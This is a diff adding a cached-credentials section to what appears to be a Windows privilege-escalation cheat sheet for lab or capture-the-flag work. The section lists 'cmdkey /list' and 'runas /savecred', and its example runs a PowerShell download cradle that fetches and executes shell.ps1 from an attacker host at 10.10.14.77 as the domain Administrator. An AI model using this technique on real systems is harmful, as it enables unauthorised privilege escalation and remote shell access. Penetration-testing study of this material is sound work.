@@ -54,6 +54,23 @@ layout: default
         
         <li>Group Policy (GPP) passwords</li>
         <li>C:\Windows\Panther\unattend.xml</li>
+        <li>Cached credentials</li>
+        <table>
+            <tr>
+                <td>Check for cached credentials</td>
+                <td>cmdkey /list</td>
+            </tr>
+            <tr>
+                <td>Run command under context of a cached credential</td>
+                <td>runas /user:&lt;user&gt; /savecred "&lt;command&gt;"</td>
+            </tr>
+            <tr>
+                <td>Example</td>
+                <td>
+                    <pre>cmdkey /list&#13;&#10;&#13;&#10;                        Currently stored credentials:&#13;&#10;                        &#13;&#10;                            Target: Domain:interactive=ACCESS\Administrator&#13;&#10;                            Type: Domain Password&#13;&#10;                            User: ACCESS\Administrator&#13;&#10;                            &#13;&#10;                                                    runas /user:ACCESS\Administrator /savecred &quot;powershell iex(new-object net.webclient).downloadstring(&apos;http://10.10.14.77/shell.ps1&apos;)&quot;</pre>
+                </td>
+            </tr>
+        </table>
     </ul>
     
     <li>Check running processes, pay attention to admin</li>
